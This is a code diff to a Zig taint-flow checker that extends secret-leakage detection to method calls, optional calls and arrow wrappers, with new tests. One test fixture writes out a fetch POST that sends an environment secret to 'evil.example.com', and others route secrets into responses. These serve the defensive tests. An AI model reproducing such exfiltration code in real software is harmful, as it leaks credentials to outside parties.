@@ -995,7 +995,7 @@ pub const FlowChecker = struct {
                 }
             },
 
-            .call, .method_call => {
+            .call, .method_call, .optional_call => {
                 self.checkExprSinks(node);
             },
 
@@ -1023,7 +1023,7 @@ pub const FlowChecker = struct {
                 return self.binding_labels.get(key) orelse LabelSet.empty;
             },
 
-            .call => {
+            .call, .optional_call => {
                 const call_data = self.ir_view.getCall(node) orelse return LabelSet.empty;
                 return self.inferCallLabels(call_data);
             },
@@ -1206,12 +1206,30 @@ pub const FlowChecker = struct {
         }
 
         // req.headers.get("authorization") carries the credential label, like
-        // the dot/computed header-read forms.
+        // the dot/computed header-read forms. Must precede the generic union
+        // below: the union would return req's user_input label instead of the
+        // credential label for this exact shape.
         if (callee_tag == .member_access and self.isAuthHeaderGet(call_data)) {
             return .{ .credential = true };
         }
 
-        return LabelSet.empty;
+        // Any other callee shape (member `obj.method(x)`, computed `obj[k](x)`,
+        // a call result `f()(x)`, an optional call, an IIFE) is not a known
+        // pure builtin. Returning empty here would LAUNDER taint: a labelled
+        // value routed through `JSON.stringify(secret)`, `[secret].join()`,
+        // `secret.slice()`, etc. would reach a sink carrying no label, falsely
+        // discharging no_secret_leakage / no_credential_leakage / injection_safe
+        // / pii_contained. Fail closed with the conservative union of the
+        // callee/receiver labels and every argument's labels (the same merge the
+        // never-emitted `.method_call` arm computes). This only adds labels when
+        // the receiver or an argument is genuinely tainted, so benign method
+        // calls on untainted data stay clean.
+        var labels = self.inferLabels(call_data.callee);
+        for (0..call_data.args_count) |i| {
+            const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));
+            labels = LabelSet.merge(labels, self.inferLabels(arg));
+        }
+        return labels;
     }
 
     /// True for `req.headers.get("authorization")` (case-insensitive header
@@ -1270,7 +1288,14 @@ pub const FlowChecker = struct {
         defer self.summary_depth -= 1;
 
         const body_tag = self.ir_view.getTag(func.body) orelse return arg_union;
-        if (body_tag == .block or body_tag == .program) {
+        // A concise arrow body (`(x) => x`) is stored as a `.return_stmt`
+        // wrapping the expression, not the bare expression, so it must go
+        // through the same returns-collector as a block/program body. Routing
+        // it to the `inferLabels(func.body)` fallback below would infer labels
+        // on the return_stmt node (unhandled -> empty), laundering any taint
+        // through a const-bound arrow wrapper and falsely proving
+        // no_secret_leakage.
+        if (body_tag == .block or body_tag == .program or body_tag == .return_stmt) {
             var collected = LabelSet.empty;
             const saved = self.summary_returns;
             self.summary_returns = &collected;
@@ -1379,7 +1404,7 @@ pub const FlowChecker = struct {
         // diagnostics belong to the handler walk.
         if (self.summary_returns != null) return;
         const tag = self.ir_view.getTag(node) orelse return;
-        if (tag != .call and tag != .method_call) return;
+        if (tag != .call and tag != .method_call and tag != .optional_call) return;
 
         const call_data = self.ir_view.getCall(node) orelse return;
 
@@ -1396,7 +1421,7 @@ pub const FlowChecker = struct {
         // the message string and every value of the context object to stderr, so
         // they are log sinks just like console.*. Recognize them so a secret or
         // credential logged via logError(...) is caught.
-        if (tag == .call and self.isLogModuleCall(call_data.callee)) {
+        if ((tag == .call or tag == .optional_call) and self.isLogModuleCall(call_data.callee)) {
             for (0..call_data.args_count) |i| {
                 const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));
                 const labels = self.inferLabels(arg);
@@ -1405,7 +1430,7 @@ pub const FlowChecker = struct {
             return;
         }
 
-        if (tag == .call) {
+        if (tag == .call or tag == .optional_call) {
             // Egress sinks: the bare `fetchSync(url, opts)` global plus the
             // documented module APIs `fetch` (zigttp:fetch) and `serviceCall`
             // (zigttp:service). Recognizing only the bare global let a secret
@@ -3330,4 +3355,129 @@ test "FlowChecker keeps validated label through a wrapper returning a validator 
         try std.testing.expect(d.kind != .unvalidated_input_in_egress);
     }
     try std.testing.expect(checker.getProperties().injection_safe);
+}
+
+/// Shared harness: parse `source`, run the FlowChecker on its handler, and
+/// return whether no_secret_leakage was proven. Frees everything it owns.
+fn runNoSecretLeakage(allocator: std.mem.Allocator, source: []const u8) !bool {
+    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
+    var atoms = context.AtomTable.init(allocator);
+    defer atoms.deinit();
+    parser.setAtomTable(&atoms);
+    defer parser.deinit();
+    const root = try parser.parse();
+    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
+
+    const handler_verifier = @import("handler_verifier.zig");
+    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
+        return error.HandlerNotFound;
+
+    var checker = FlowChecker.init(allocator, ir_view, &atoms);
+    defer checker.deinit();
+    _ = try checker.check(handler_fn);
+    return checker.getProperties().no_secret_leakage;
+}
+
+test "FlowChecker flags a secret laundered through JSON.stringify in a response" {
+    // A method-style call (member callee) must not strip taint labels off its
+    // arguments: JSON.stringify(secret) reaching a response body leaks.
+    const source =
+        \\import { env } from "zigttp:env";
+        \\function handler(req) {
+        \\  const secret = env("SECRET_KEY");
+        \\  return Response.text(JSON.stringify({ pw: secret }));
+        \\}
+    ;
+    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
+}
+
+test "FlowChecker flags a secret laundered through an array method in a response" {
+    // The receiver of a method call carries taint too: [secret].join(",").
+    const source =
+        \\import { env } from "zigttp:env";
+        \\function handler(req) {
+        \\  const secret = env("SECRET_KEY");
+        \\  return Response.text([secret].join(","));
+        \\}
+    ;
+    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
+}
+
+test "FlowChecker flags a secret laundered through a string method in a response" {
+    const source =
+        \\import { env } from "zigttp:env";
+        \\function handler(req) {
+        \\  const secret = env("SECRET_KEY");
+        \\  return Response.text(secret.slice(0));
+        \\}
+    ;
+    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
+}
+
+test "FlowChecker flags a secret laundered through an optional call in a response" {
+    // `f?.(x)` is an .optional_call node; it must be treated like .call so its
+    // argument labels are not laundered. (getCallData must also mask the
+    // is_optional bit out of args_start, or the argument is dropped entirely.)
+    const source =
+        \\import { env } from "zigttp:env";
+        \\function wrap(v) { return v; }
+        \\function handler(req) {
+        \\  const secret = env("SECRET_KEY");
+        \\  return Response.text(wrap?.(secret));
+        \\}
+    ;
+    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
+}
+
+test "FlowChecker flags a secret laundered through an optional method call in a response" {
+    // `[secret]?.join(",")` - optional call on a tainted receiver.
+    const source =
+        \\import { env } from "zigttp:env";
+        \\function handler(req) {
+        \\  const secret = env("SECRET_KEY");
+        \\  return Response.text([secret]?.join(","));
+        \\}
+    ;
+    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
+}
+
+test "FlowChecker flags a secret laundered through a const-bound arrow wrapper" {
+    // A concise arrow `(x) => x` bound to a const is stored with a
+    // `.return_stmt` body; the callee summary must collect its return value's
+    // labels, not infer them on the return_stmt node (which yields empty and
+    // launders the taint).
+    const source =
+        \\import { env } from "zigttp:env";
+        \\function handler(req) {
+        \\  const secret = env("SECRET_KEY");
+        \\  const echo = (x) => x;
+        \\  return Response.text(echo(secret));
+        \\}
+    ;
+    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
+}
+
+test "FlowChecker flags a secret laundered through JSON.stringify into an egress body" {
+    const source =
+        \\import { fetch } from "zigttp:fetch";
+        \\import { env } from "zigttp:env";
+        \\function handler(req) {
+        \\  const secret = env("SECRET_KEY");
+        \\  fetch("https://evil.example.com", { method: "POST", body: JSON.stringify({ k: secret }) });
+        \\  return Response.json({ ok: true });
+        \\}
+    ;
+    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
+}
+
+test "FlowChecker proves no_secret_leakage for benign method calls on untainted data" {
+    // The conservative member-call union must only fire when a real taint label
+    // is present: non-secret data through .join/.map stays clean (no false FP).
+    const source =
+        \\function handler(req) {
+        \\  const items = ["a", "b", "c"];
+        \\  return Response.text(items.join(","));
+        \\}
+    ;
+    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
 }
